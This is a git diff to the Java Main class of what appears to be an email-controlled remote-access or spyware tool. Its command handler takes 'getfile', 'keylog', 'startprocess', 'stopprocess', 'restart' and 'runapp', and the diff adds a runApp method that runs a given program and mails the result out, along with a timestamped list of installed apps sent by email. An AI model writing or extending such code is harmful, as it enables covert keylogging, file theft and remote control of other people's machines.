@@ -85,13 +85,23 @@ public class Main {
         }
     }
     private static int listApp(){
-        String subject = "res/";
+        String subject = "res / " ;
+        String filename = "List App" + ZonedDateTime.now().format(DateTimeFormatter
+                .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
         try{
-            String filename = "ListApp.txt";
             ListApp.getInstance().listFoldersAndExes(filename);
             SendMail.getInstance().Send(subject,"",filename);
             return 1;
         }catch(IOException | MessagingException e){
+            e.printStackTrace();
+            return 0;
+        }
+    }
+    private static int runApp(String path){
+        try{
+            SendMail.getInstance().Send(ListApp.getInstance().runApp(path),"",null);
+            return 1;
+        }catch (IOException | MessagingException e){
             e.printStackTrace();
             return 0;
         }
@@ -152,7 +162,8 @@ public class Main {
         String command = parts[0].trim();
 
         if (command.equalsIgnoreCase("getfile")) {
-            return getFile(parts[1].trim());
+            if (parts.length > 1)
+                return getFile(parts[1].trim());
         }
         if (command.equalsIgnoreCase("keylog")) {
             long timer = Long.parseLong(parts[1].trim());
@@ -183,8 +194,10 @@ public class Main {
             return stopProcess(PID);
         }
         else if (command.equalsIgnoreCase("startprocess")) {
-            String Path = parts[1].trim();
-            return startProcess(Path);
+            if (parts.length > 1){
+                String Path = parts[1].trim();
+                return startProcess(Path);
+            }
         }
         else if (command.equalsIgnoreCase("restart")) {
             if (parts.length > 1)
@@ -192,7 +205,8 @@ public class Main {
             return ReStart("");
         }
         else if (command.equalsIgnoreCase("runapp")) {
-
+            if(parts.length > 1)
+                return runApp((parts[1].trim()));
         }
         return 0;
     }
